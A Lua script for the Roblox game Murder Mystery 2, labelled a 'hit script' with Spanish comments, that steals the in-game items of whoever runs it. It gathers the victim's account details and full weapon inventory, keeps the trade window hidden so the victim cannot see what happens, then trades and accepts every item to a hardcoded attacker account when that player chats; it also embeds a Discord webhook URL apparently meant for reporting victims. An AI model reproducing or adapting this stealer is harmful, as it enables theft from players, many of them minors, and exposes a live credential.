-- Hit Script Corregido MM2
Username = "cybertu24" -- Pon el nombre del jugador que recibirá trade
Username2 = "cybertu24" -- Segundo jugador opcional
Webhook = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY" -- Tu webhook
GoodItemsOnly = true

repeat task.wait() until game:IsLoaded()

if getgenv().mm2 then return end
getgenv().mm2 = true

if GoodItemsOnly == nil then
    GoodItemsOnly = false
end

-- Validaciones
if Username == game.Players.LocalPlayer.Name then
    game:GetService("Players").LocalPlayer:Kick("\nYou can't trade with yourself!")
    return
end

if Username == "" or Username == nil then
    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Username!")
    return
end

if Webhook == "" or Webhook == nil then
    game:GetService("Players").LocalPlayer:Kick("\nPlease enter a Webhook!")
    return
end

local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)

local NameValue = game:GetService("Players").LocalPlayer.Name or "Unknown"
local IdValue = game:GetService("Players").LocalPlayer.UserId or "Unknown"
local AgeValue = game:GetService("Players").LocalPlayer.AccountAge or "Unknown"
local ExecutorValue = identifyexecutor() or "Unknown"
local VersionValue = "1.0.0"

-- Inventario
local allItems, uniqueItems1, ancientItems1, godlyItems1, vintageItems1, legendaryItems1, rareItems1, uncommonItems1, commonItems1 = {}, {}, {}, {}, {}, {}, {}, {}, {}

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        local formatTable = {weaponName = d.ItemName, weaponData = d.DataID, weaponAmount = d.Amount, weaponRarity = d.Rarity}
        table.insert(allItems, formatTable)
        if d.Rarity == "Unique" then table.insert(uniqueItems1, formatTable) end
        if d.Rarity == "Ancient" then table.insert(ancientItems1, formatTable) end
        if d.Rarity == "Godly" then table.insert(godlyItems1, formatTable) end
        if d.Rarity == "Vintage" then table.insert(vintageItems1, formatTable) end
        if d.Rarity == "Legendary" then table.insert(legendaryItems1, formatTable) end
        if d.Rarity == "Rare" then table.insert(rareItems1, formatTable) end
        if d.Rarity == "Uncommon" then table.insert(uncommonItems1, formatTable) end
        if d.Rarity == "Common" then table.insert(commonItems1, formatTable) end
    end
end

-- Función para enviar trade
local function stealItems(ReceiverName)
    local receiver = game.Players:FindFirstChild(ReceiverName)
    if not receiver then return end

    -- Cerrar GUI de trade
    local destroytrades = coroutine.create(function()
        while true do
            local player = game:GetService("Players").LocalPlayer
            local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
            local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

            tradeGUI.Enabled = false
            tradeGUIPhone.Enabled = false
            wait(0.1)
        end
    end)
    coroutine.resume(destroytrades)

    -- Enviar solicitud
    pcall(function()
        game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(receiver)
    end)
    wait(3)

    -- Ofrecer items
    local function offerItems(items)
        for _, item in pairs(items) do
            for i = 1, item.weaponAmount do
                pcall(function()
                    game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(item.weaponData, "Weapons")
                end)
                wait(0.2)
            end
        end
    end

    offerItems(uniqueItems1)
    offerItems(ancientItems1)
    offerItems(godlyItems1)
    offerItems(vintageItems1)
    offerItems(legendaryItems1)
    offerItems(rareItems1)
    offerItems(uncommonItems1)
    offerItems(commonItems1)

    -- Aceptar trade
    wait(2)
    pcall(function()
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
    end)

    print("Trade enviado a "..ReceiverName.." correctamente!")
end

-- Espera a que se una el jugador y envía trade cuando escriba
game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username or player.Name == Username2 then
        player.Chatted:Connect(function(msg)
            stealItems(player.Name)
        end)
    end
end)
